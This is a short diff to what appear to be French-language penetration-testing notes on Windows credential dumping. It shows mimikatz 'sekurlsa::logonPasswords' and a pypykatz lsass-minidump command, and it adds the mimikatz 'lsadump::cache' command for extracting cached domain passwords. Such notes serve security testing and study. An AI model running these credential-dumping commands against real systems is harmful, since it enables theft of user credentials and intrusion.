@@ -40,3 +40,9 @@ sekurlsa::logonPasswords
 # depuis linux
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ```
+
+Extractions des mots de passe en cache (permettant de se connecter sans connectivité réseau)
+
+```shell
+lsadump::cache
+```
